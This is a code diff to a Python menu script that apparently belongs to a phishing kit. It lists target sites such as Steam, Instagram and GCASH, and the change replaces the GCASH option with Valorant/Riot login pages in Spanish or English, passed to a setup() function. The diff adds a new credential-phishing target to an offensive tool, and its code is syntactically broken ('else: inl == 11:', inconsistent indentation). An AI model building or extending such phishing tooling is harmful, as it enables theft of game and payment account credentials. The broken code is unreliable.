@@ -99,7 +99,7 @@ def menu():
 
     [9] Steam      [10] Instagram
 
-    [11] GCASH
+    [11] Valorant 
     """)
     inl = int(input('\n>> '))
     if inl == 1:
@@ -187,10 +187,20 @@ def menu():
         time.sleep(2)
         menu()
    else: inl == 11:
-        site == "Gcash login"
-        setup(site) 
-   else: 
-        print(f'{Fore.RED}\n[!] Error Option Invalid!')
+        print('\n[~] Select user language:')
+        print('\n[1] Español')
+        print('\n[2] Ingles')
+        a = int(input('\n>> '))
+        if a == 1:
+          site = "Valorant"
+          setup(site) 
+        elif a == 2:
+            site = "Riot_en"
+            setup(site)     
+   else:
+        print(f'{Fore.RED}\n[!] Error  Option Invalid!')
+        time.sleep(2)
+        menu()
 
 def config():
     home = os.getenv("HOME")
